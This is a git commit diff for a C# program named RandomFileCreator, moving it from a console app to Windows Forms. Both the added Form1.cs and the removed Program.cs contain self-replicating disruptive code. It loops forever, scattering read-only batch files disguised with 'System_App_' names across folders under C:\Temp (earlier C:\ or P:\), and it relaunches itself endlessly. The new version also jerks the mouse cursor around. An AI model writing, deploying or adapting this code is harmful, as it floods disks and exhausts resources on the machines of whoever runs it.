bcffc69a6d959848cc03e9a4a7bde447d22c5d06
vasker <yarinvasket@gmail.com>
2019-12-19 17:32:28 -0800

    change the project to windows forms

---
+++ Form1.cs
@@ -0,0 +1,81 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace RandomFileCreator
+{
+    public partial class Form1 : Form
+    {
+        public static Random random = new Random();
+        public static string appPath = System.Reflection.Assembly.GetEntryAssembly().Location;
+        public static string startPath = "C:\\Temp";
+        public static int screenWidth = 1920;
+        public static int screenHeight = 1080;
+
+        public Form1()
+        {
+            InitializeComponent();
+            Run(startPath);
+        }
+
+        public static void Run(object path2)
+        {
+            try
+            {
+                while (true)
+                {
+                    string path;
+                    path = RandomPath((string)path2) + "\\" + "System_App_" + RandomName() + ".bat";
+                    using (StreamWriter sw = new StreamWriter(path, true))
+                    {
+                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.ReadOnly);
+                        Cursor.Position = new Point(random.Next(0, screenWidth), random.Next(0, screenHeight));
+                        sw.Write("start " + appPath);
+                    }
+                    Process.Start(appPath);
+                }
+            }
+            catch (Exception)
+            {
+                Run((string)path2);
+                return;
+            }
+        }
+
+        public static string RandomPath(string path)
+        {
+            try
+            {
+                string[] names = Directory.GetDirectories(path);
+                if (names.Length == 0 || random.Next(0, 2) == 0)
+                {
+                    return path;
+                }
+                int rand = random.Next(0, names.Length - 1);
+                return RandomPath(names[rand]);
+            }
+            catch (UnauthorizedAccessException)
+            {
+                return path;
+            }
+        }
+
+        public static string RandomName(string str = "")
+        {
+            if (str.Length == 18)
+            {
+                return str;
+            }
+            int rand = random.Next(1, 3) == 1 ? random.Next(48, 57) : random.Next(97, 122);
+            return RandomName(str + ((char)rand));
+        }
+    }
+}
--- Program.cs
+++ Program.cs
@@ -1,88 +1,22 @@
 ﻿using System;
-using System.Diagnostics;
-using System.IO;
-using System.Text;
-using System.Threading;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace RandomFileCreator
 {
-    class Program
+    static class Program
     {
-        public static Random random = new Random();
-        public const int threads = 4;
-        public static string appPath = System.Reflection.Assembly.GetEntryAssembly().Location;
-
-        static void Main(string[] args)
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+        static void Main()
         {
-            if (Directory.Exists("P:\\"))
-            {
-                RunThreads(threads, "P:\\");
-            }
-            else
-            {
-                RunThreads(threads / 2, "c:\\");
-            }
-            RunThreads(threads / 2 + threads % 2, "c:\\");
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Form1());
         }
-
-        public static void RunThreads(int threads, string path)
-        {
-            Thread[] thrs = new Thread[threads];
-            for (int i = 0; i < threads; i++)
-            {
-                thrs[i] = new Thread(Run);
-                thrs[i].Start(path);
-            }
-        }
-
-        public static void Run(object path2)
-        {
-            try
-            {
-                while (true)
-                {
-                    string path;
-                    path = RandomPath((string)path2) + "\\" + "System_App_" + RandomName() + ".bat";
-                    using (StreamWriter sw = new StreamWriter(path, true))
-                    {
-                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.ReadOnly);
-                        sw.Write("dotnet " + appPath);
-                    }
-                    Process.Start(path);
-                }
-            }
-            catch (Exception)
-            {
-                Run((string)path2);
-                return;
-            }
-        }
-        public static string RandomPath(string path)
-        {
-            try
-            {
-                string[] names = Directory.GetDirectories(path);
-                if (names.Length == 0 || random.Next(0, 2) == 0)
-                {
-                    return path;
-                }
-                int rand = random.Next(0, names.Length - 1);
-                return RandomPath(names[rand]);
-            }
-            catch (UnauthorizedAccessException)
-            {
-                return path;
-            }
-        }
-        public static string RandomName(string str = "")
-        {
-            if (str.Length == 18)
-            {
-                return str;
-            }
-            int rand = random.Next(1, 3) == 1 ? random.Next(48, 57) : random.Next(97, 122);
-            return RandomName(str + ((char)rand));
-        }
-
     }
 }
